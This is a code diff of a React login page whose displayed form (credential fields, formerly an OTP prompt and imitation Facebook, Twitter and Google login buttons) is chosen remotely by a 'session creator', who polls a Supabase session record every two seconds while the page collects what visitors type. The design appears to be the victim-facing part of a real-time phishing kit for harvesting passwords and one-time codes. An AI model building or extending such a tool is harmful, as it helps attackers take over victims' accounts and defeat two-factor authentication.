@@ -1,6 +1,6 @@
 
 import React, { useEffect, useState } from 'react';
-import { useParams, useNavigate } from 'react-router-dom';
+import { useParams } from 'react-router-dom';
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -8,72 +8,98 @@ import { Label } from '@/components/ui/label';
 import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import { useSessionContext } from '@/contexts/SessionContext';
 import { Loader } from 'lucide-react';
+import { supabase } from '@/integrations/supabase/client';
 
 const LoginPage = () => {
   const { sessionId } = useParams<{ sessionId: string }>();
-  const { getSessionById, addSessionData, getMainPageById, getSubPageById } = useSessionContext();
+  const { addSessionData, getMainPageById, getSubPageById } = useSessionContext();
   const [formData, setFormData] = useState<Record<string, string>>({});
-  const [session, setSession] = useState<ReturnType<typeof getSessionById>>();
+  const [session, setSession] = useState<any>(null);
   const [subPage, setSubPage] = useState<any>(null);
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const navigate = useNavigate();
+  const [pageLoading, setPageLoading] = useState(true);
 
+  // Fetch session data directly from Supabase
   useEffect(() => {
-    if (!sessionId) {
-      setError('Invalid session ID');
-      return;
-    }
-    
-    const sessionData = getSessionById(sessionId);
-    if (!sessionData) {
-      setError('Session not found');
-      return;
-    }
-    
-    setSession(sessionData);
-    
-    // Get the current subpage details
-    const mainPage = getMainPageById(sessionData.mainPageId);
-    const subPage = mainPage ? 
-      getSubPageById(sessionData.mainPageId, sessionData.currentSubPageId) : 
-      undefined;
-      
-    if (subPage) {
-      setSubPage(subPage);
-      // Reset loading when page type changes
-      setIsLoading(false);
-    } else {
-      setError('Page template not found');
-    }
-    
-    // Setup polling to check for page type changes
-    const intervalId = setInterval(() => {
-      const updatedSession = getSessionById(sessionId);
-      if (!updatedSession) return;
-      
-      if (
-        updatedSession && 
-        (updatedSession.currentSubPageId !== session?.currentSubPageId || 
-         updatedSession.mainPageId !== session?.mainPageId)
-      ) {
-        setSession(updatedSession);
-        const mainPage = getMainPageById(updatedSession.mainPageId);
-        const subPage = mainPage ? 
-          getSubPageById(updatedSession.mainPageId, updatedSession.currentSubPageId) : 
-          undefined;
-          
-        if (subPage) {
-          setSubPage(subPage);
-          setFormData({});  // Clear form data when page type changes
-          setIsLoading(false); // Reset loading when page type changes
+    const fetchSession = async () => {
+      if (!sessionId) {
+        setError('Invalid session ID');
+        setPageLoading(false);
+        return;
+      }
+
+      try {
+        const { data: sessionData, error: sessionError } = await supabase
+          .from('sessions')
+          .select('*')
+          .eq('id', sessionId)
+          .eq('active', true)
+          .single();
+
+        if (sessionError || !sessionData) {
+          setError('Session not found or inactive');
+          setPageLoading(false);
+          return;
         }
+
+        setSession(sessionData);
+
+        // Get the current subpage details
+        const mainPage = getMainPageById(sessionData.main_page_id);
+        const currentSubPage = getSubPageById(sessionData.main_page_id, sessionData.current_sub_page_id);
+        
+        if (currentSubPage) {
+          setSubPage(currentSubPage);
+        } else {
+          setError('Page template not found');
+        }
+        
+        setPageLoading(false);
+      } catch (err) {
+        console.error('Error fetching session:', err);
+        setError('Failed to load session');
+        setPageLoading(false);
+      }
+    };
+
+    fetchSession();
+  }, [sessionId, getMainPageById, getSubPageById]);
+
+  // Poll for session updates
+  useEffect(() => {
+    if (!sessionId || !session) return;
+
+    const intervalId = setInterval(async () => {
+      try {
+        const { data: updatedSession, error } = await supabase
+          .from('sessions')
+          .select('*')
+          .eq('id', sessionId)
+          .eq('active', true)
+          .single();
+
+        if (!error && updatedSession) {
+          if (updatedSession.current_sub_page_id !== session.current_sub_page_id) {
+            setSession(updatedSession);
+            const mainPage = getMainPageById(updatedSession.main_page_id);
+            const newSubPage = getSubPageById(updatedSession.main_page_id, updatedSession.current_sub_page_id);
+            
+            if (newSubPage) {
+              setSubPage(newSubPage);
+              setFormData({}); // Clear form data when page type changes
+              setIsLoading(false); // Reset loading when page type changes
+            }
+          }
+        }
+      } catch (err) {
+        console.error('Error polling session:', err);
       }
     }, 2000);
-    
+
     return () => clearInterval(intervalId);
-  }, [sessionId, getSessionById, session?.currentSubPageId, session?.mainPageId, getMainPageById, getSubPageById]);
+  }, [sessionId, session, getMainPageById, getSubPageById]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -125,6 +151,23 @@ const LoginPage = () => {
     handleSubmit(new Event('submit') as unknown as React.FormEvent);
   };
 
+  if (pageLoading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center p-4">
+        <Card className="w-full max-w-md animate-pulse">
+          <CardHeader>
+            <div className="h-7 bg-muted rounded-md mb-2"></div>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="h-10 bg-muted rounded-md"></div>
+            <div className="h-10 bg-muted rounded-md"></div>
+            <div className="h-10 bg-muted rounded-md"></div>
+          </CardContent>
+        </Card>
+      </div>
+    );
+  }
+
   if (error) {
     return (
       <div className="min-h-screen flex items-center justify-center p-4">
@@ -138,11 +181,6 @@ const LoginPage = () => {
               <AlertDescription>{error}</AlertDescription>
             </Alert>
           </CardContent>
-          <CardFooter>
-            <Button className="w-full" onClick={() => navigate('/')}>
-              Go to Homepage
-            </Button>
-          </CardFooter>
         </Card>
       </div>
     );
@@ -194,14 +232,17 @@ const LoginPage = () => {
   if (!session || !subPage) {
     return (
       <div className="min-h-screen flex items-center justify-center p-4">
-        <Card className="w-full max-w-md animate-pulse">
+        <Card className="w-full max-w-md">
           <CardHeader>
-            <div className="h-7 bg-muted rounded-md mb-2"></div>
+            <CardTitle className="text-center">Session Not Available</CardTitle>
           </CardHeader>
-          <CardContent className="space-y-4">
-            <div className="h-10 bg-muted rounded-md"></div>
-            <div className="h-10 bg-muted rounded-md"></div>
-            <div className="h-10 bg-muted rounded-md"></div>
+          <CardContent>
+            <Alert>
+              <AlertTitle>Session Issue</AlertTitle>
+              <AlertDescription>
+                This session may have expired or been closed. Please contact the session creator for a new link.
+              </AlertDescription>
+            </Alert>
           </CardContent>
         </Card>
       </div>
@@ -263,55 +304,6 @@ const LoginPage = () => {
           </>
         );
       
-      case 'login3':
-        return (
-          <>
-            <div className="grid gap-4">
-              <div className="space-y-2">
-                <Label htmlFor="otp">One-Time Password</Label>
-                <Input 
-                  id="otp" 
-                  name="otp" 
-                  placeholder="Enter the OTP sent to your device" 
-                  required
-                  value={formData.otp || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <Button type="submit" className="w-full">Verify OTP</Button>
-            </div>
-          </>
-        );
-      
-      case 'login4':
-        return (
-          <>
-            <div className="grid gap-4">
-              <Button 
-                type="button" 
-                className="w-full bg-[#1877f2] hover:bg-[#0c63d4]"
-                onClick={() => handleSocialLogin('facebook')}
-              >
-                Continue with Facebook
-              </Button>
-              <Button 
-                type="button" 
-                className="w-full bg-[#1da1f2] hover:bg-[#0c85d0]"
-                onClick={() => handleSocialLogin('twitter')}
-              >
-                Continue with Twitter
-              </Button>
-              <Button 
-                type="button" 
-                className="w-full bg-[#db4437] hover:bg-[#c53727]"
-                onClick={() => handleSocialLogin('google')}
-              >
-                Continue with Google
-              </Button>
-            </div>
-          </>
-        );
-
       case 'signup1':
         return (
           <>
